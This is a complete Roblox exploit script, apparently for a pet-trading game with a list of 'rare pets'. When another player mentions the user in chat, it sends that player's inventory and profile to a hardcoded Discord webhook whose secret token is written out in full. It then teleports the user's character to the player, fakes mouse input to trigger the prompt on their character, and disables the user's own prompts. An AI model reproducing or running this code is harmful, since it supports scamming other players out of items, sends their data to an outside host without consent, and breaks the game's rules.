-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")

-- Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

-- Webhook function that works everywhere
local function sendWebhook(content, embed)
    local payload = {
        content = content,
        embeds = {embed}
    }
    
    local success, err = pcall(function()
        local json = HttpService:JSONEncode(payload)
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, json)
        end
    end)
    
    if not success then
        warn("Webhook failed:", err)
    end
end

-- Get character with guaranteed return
local function getCharacter(player)
    return player.Character or player.CharacterAdded:Wait()
end

-- Find the prompt on HumanoidRootPart
local function findPrompt(char)
    local root = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 2)
    if not root then return nil end
    
    for _, child in pairs(root:GetChildren()) do
        if child:IsA("ProximityPrompt") then
            return child
        end
    end
    return nil
end

-- Precise clicking that actually works
local function clickPrompt(prompt)
    if not prompt then return false end
    
    local part = prompt.Parent
    local startTime = os.clock()
    
    -- Get screen position with retry
    local screenPos, visible
    for _ = 1, 3 do
        screenPos, visible = Camera:WorldToScreenPoint(part.Position)
        if visible then break end
        task.wait(0.1)
    end
    if not visible then return false end
    
    -- Target position with vertical adjustment
    local targetPos = Vector2.new(screenPos.X, screenPos.Y - 35)
    
    -- Move mouse smoothly
    for i = 1, 5 do
        local t = i/5
        local newPos = Vector2.new(
            targetPos.X * t,
            targetPos.Y * t
        )
        VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
        task.wait(0.05)
    end
    
    -- Click and hold
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, true, game, 1)
    
    -- Keep position during hold
    while os.clock() - startTime < prompt.HoldDuration + 0.3 do
        screenPos = Camera:WorldToScreenPoint(part.Position)
        if screenPos then
            targetPos = Vector2.new(screenPos.X, screenPos.Y - 35)
            VirtualInputManager:SendMouseMoveEvent(targetPos.X, targetPos.Y, game)
        end
        task.wait(0.05)
    end
    
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, false, game, 1)
    return true
end

-- Interact with target player
local function interactWithTarget(target)
    local targetChar = getCharacter(target)
    local myChar = getCharacter(LocalPlayer)
    
    -- Position in front
    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -2.5))
    end
    
    -- Find and click prompt
    local prompt = findPrompt(targetChar)
    if prompt then
        for _ = 1, 3 do -- Try 3 times
            if clickPrompt(prompt) then break end
            task.wait(0.5)
        end
    end
end

-- Handle player chat
local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    
    -- Check for mentions
    if not message:lower():find("@"..LocalPlayer.Name:lower()) and
       not message:lower():find("@everyone") and
       not message:lower():find("@here") then
        return
    end
    
    -- Get inventory
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    -- Create webhook
    local embed = {
        title = "🚨 "..player.Name.." mentioned you!",
        description = "**Message:** ```"..message.."```",
        color = 0xFFA500,
        fields = {
            {name = "📦 Inventory ("..#items..")", value = #items > 0 and "```"..table.concat(items, ", ").."```" or "```Empty```", inline = false},
            {name = "🔗 Profile", value = "[Click here](https://www.roblox.com/users/"..player.UserId.."/profile)", inline = false}
        }
    }
    
    sendWebhook("@everyone", embed)
    interactWithTarget(player)
end

-- Initialize
local function main()
    -- Setup chat listeners
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.Chatted:Connect(function(msg)
                onPlayerChatted(player, msg)
            end)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(function(msg)
            onPlayerChatted(player, msg)
        end)
    end)
    
    -- Disable local prompts
    local function disablePrompts(char)
        local root = char:WaitForChild("HumanoidRootPart", 2)
        if root then
            for _, child in pairs(root:GetChildren()) do
                if child:IsA("ProximityPrompt") then
                    child.Enabled = false
                end
            end
        end
    end
    
    if LocalPlayer.Character then
        disablePrompts(LocalPlayer.Character)
    end
    LocalPlayer.CharacterAdded:Connect(disablePrompts)
    
    print("✅ Script is fully operational!")
end

-- Start with error protection
local success, err = pcall(main)
if not success then
    warn("❌ Script failed to start:", err)
end
